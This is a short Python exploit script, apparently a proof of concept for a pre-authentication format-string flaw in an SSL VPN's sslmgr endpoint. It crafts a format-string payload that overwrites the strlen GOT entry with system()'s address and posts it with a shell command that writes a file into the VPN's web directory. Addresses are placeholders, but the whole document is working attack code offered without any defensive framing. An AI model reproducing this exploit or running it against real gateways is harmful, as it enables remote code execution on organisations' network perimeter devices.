#!/usr/bin/python

import requests
from pwn import *

url = "https://sslvpn/sslmgr"
cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt"

strlen_GOT = 0x667788 # change me
system_plt = 0x445566 # change me

fmt =  '%70$n'
fmt += '%' + str((system_plt>>16)&0xff) + 'c'
fmt += '%32$hn'
fmt += '%' + str((system_plt&0xffff)-((system_plt>>16)&0xff)) + 'c'
fmt += '%24$hn'
for i in range(40,60):
    fmt += '%'+str(i)+'$p'

data = "scep-profile-name="
data += p32(strlen_GOT)[:-1]
data += "&appauthcookie="
data += p32(strlen_GOT+2)[:-1]
data += "&host-id="
data += p32(strlen_GOT+4)[:-1]
data += "&user-email="
data += fmt
data += "&appauthcookie="
data += cmd
r = requests.post(url, data=data)
